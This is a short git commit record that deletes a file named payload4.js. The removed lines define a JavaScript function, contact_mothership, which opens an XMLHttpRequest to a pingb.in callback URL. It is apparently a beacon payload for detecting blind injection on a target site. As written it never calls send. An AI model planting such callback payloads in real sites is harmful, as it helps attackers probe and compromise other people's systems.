a4445d8207cf6f546f1447b986768f2716e7fe28
Zaddish <40848785+Zaddish@users.noreply.github.com>
2022-10-27 06:03:22 +1100

    Delete payload4.js

--- payload4.js
+++
@@ -1,6 +0,0 @@
-function contact_mothership() {
-    var http = new XMLHttpRequest();
-    var url = "http://pingb.in/p/249d4015bcbb7f5a65edb36aa79a";
-    http.open("GET", url, true);
-}
-contact_mothership();
